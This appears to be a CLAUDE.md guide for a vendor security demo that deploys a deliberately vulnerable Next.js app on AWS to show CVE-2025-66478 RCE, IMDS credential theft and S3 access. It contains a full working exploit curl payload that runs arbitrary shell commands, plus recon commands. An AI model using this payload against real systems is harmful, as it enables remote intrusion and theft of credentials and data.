# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with this codebase.

## Project Overview

This is a **Wiz security demo environment** showcasing the React Server Components RCE vulnerability (React2Shell, CVE-2025-66478). The demo runs on AWS EC2 with Terraform IaC.

### Demo Purpose

Demonstrates Wiz platform capabilities:
- **Wiz Code**: IDE & repo scanning for vulnerable packages and risky IaC
- **Wiz Cloud**: Agentless CNAPP-style discovery and graph visualization
- **Wiz Defend / Wiz Sensor**: Runtime detection of RCE behavior
- **Wiz CLI**: Code-to-cloud context and CI scanning

### Attack Path Narrative

```
Amazon Linux Container:  Internet → 54.206.239.140:3000 → Docker (RCE) → IMDS → IAM Role → S3
Amazon Linux Native:     Internet → 54.206.239.140:3001 → EC2 Host (RCE) → IMDS → IAM Role → S3
Ubuntu Native:           Internet → 52.62.49.203:80    → EC2 Host (RCE) → IMDS → IAM Role → S3
```

### Static IPs (Elastic IPs for ASM)

| Instance | IP | Ports |
|----------|-----|-------|
| Amazon Linux | 54.206.239.140 | 3000 (container), 3001 (native) |
| Ubuntu | 52.62.49.203 | 80 (native) |

## Repository Structure

```
app/nextjs/           # Vulnerable Next.js 16.0.6 application (React 19.2.0)
infra/aws/            # Terraform: VPC, EC2, S3, ECR, IAM
wizcli                # Wiz CLI binary
```

## Development Commands

### Next.js App (Local)

```bash
cd app/nextjs
npm install
npm run dev          # Start dev server at http://localhost:3000
npm run build        # Production build
npm run lint         # Run ESLint
```

### Docker Build

```bash
cd app/nextjs
docker build --platform linux/amd64 -t wiz-rsc-demo:latest .
docker run --rm -p 3000:3000 wiz-rsc-demo:latest
```

**Note:** Container includes curl, aws-cli, and bash for exploit demo. CVE-2025-66478 RCE works in both dev and production modes.

### Terraform (Infrastructure)

```bash
cd infra/aws
terraform init
terraform plan
terraform apply      # Outputs: app_url, ec2_public_ip, s3_bucket_name
terraform destroy
```

## Key Technical Details

### Vulnerable Versions (Intentional)

| Package | Version | Notes |
|---------|---------|-------|
| Next.js | 16.0.6 | CVE-2025-66478 - RSC deserialization RCE |
| React | 19.2.0 | Paired with vulnerable Next.js |

### Infrastructure Design

- **Amazon Linux EC2** (54.206.239.140):
  - **Container (port 3000)**: `~/start-demo.sh` - pulls from ECR, runs in Docker
  - **Native (port 3001)**: `~/start-native.sh` - clones repo, builds and runs
  - SSH: `ssh -i wiz-master-demo.pem ec2-user@54.206.239.140`
- **Ubuntu EC2** (52.62.49.203):
  - **Native (port 80)**: `~/start-app.sh` - clones repo, builds and runs
  - SSH: `ssh -i wiz-master-demo.pem ubuntu@52.62.49.203`
- **Over-permissive IAM**: Instance profile has S3 read access (lateral movement path)
- **Public S3 bucket**: Contains fake PII, medical records, API keys
- **IMDSv1 enabled**: Allows credential theft from container and native apps
- **Elastic IPs**: Static IPs for ASM tracking

### App Routes

- `/` – Landing page (changes to "PWNED" when `/tmp/banner.json` exists)

### RCE Demo Capabilities

When exploited via CVE-2025-66478, the app allows:
1. Recon commands: `whoami`, `id`, `uname -a`, `cat /etc/passwd`
2. File writes: `/tmp/pwned.txt`, `/tmp/banner.json` (triggers UI change)
3. AWS access: `aws s3 ls`, `aws s3 cp` using instance IAM role

## Exploit Payload (CVE-2025-66478)

Use port 3000 for container, port 3001 for native.

```bash
curl -X POST http://<TARGET>:3000 \
  -H "Next-Action: x" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
  --data-binary $'------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name="0"\r
\r
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\\"then\\\":\\\"$B1337\\\"}","_response":{"_prefix":"process.mainModule.require('"'"'child_process'"'"').execSync('"'"'YOUR_COMMAND_HERE'"'"');","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name="1"\r
\r
"$@0"\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name="2"\r
\r
[]\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r
'
```

**Usage:** Replace `YOUR_COMMAND_HERE` with any shell command.

**Notes:**
- No Action ID needed - use `Next-Action: x` header
- Single quotes in commands need escaping: `'"'"'`
- Base64 encoding simplifies complex payloads

## Working Style Rules

1. **One major thing at a time** – Focus on the current task only
2. **Keep complexity low** – Prefer simple, readable Terraform
3. **No real secrets** – Use fake/demo data only
4. **Full-file outputs** – Show complete files, not diffs
5. **Be explicit about assumptions** – Document version choices
6. **Respect user pace** – Don't ask "Ready for the next step?" – wait for explicit requests

## Current State

- ✅ Next.js app with vulnerable versions (Next.js 16.0.6, React 19.2.0)
- ✅ Amazon Linux EC2 with container (port 3000) and native (port 3001)
- ✅ Ubuntu EC2 with native app (port 80)
- ✅ Docker container with curl/aws-cli/bash (RCE works in dev and prod)
- ✅ Elastic IPs for stable ASM tracking
- ✅ Terraform for EC2 + S3 + IAM + CloudTrail + VPC Flow Logs
- ✅ S3 bucket with fake PII, medical records, API keys
- ✅ RCE exploit works (CVE-2025-66478)
- ✅ Demo script (`wiz-demo.sh`) with 17 attack patterns
- ✅ Wiz Sensor installed

## Demo Script

Run the consolidated attack demo:

```bash
./wiz-demo.sh <target-ip> <port>

# Examples:
./wiz-demo.sh 54.206.239.140 3000   # Amazon Linux container
./wiz-demo.sh 54.206.239.140 3001   # Amazon Linux native
./wiz-demo.sh 52.62.49.203 80       # Ubuntu native
```

The script executes 17 attack patterns including RCE, IMDS credential theft, S3 enumeration, OAST callbacks, and persistence mechanisms.

## Security Warning

> **DO NOT DEPLOY TO PRODUCTION**
>
> This repository contains intentionally vulnerable code for security demonstration purposes only.
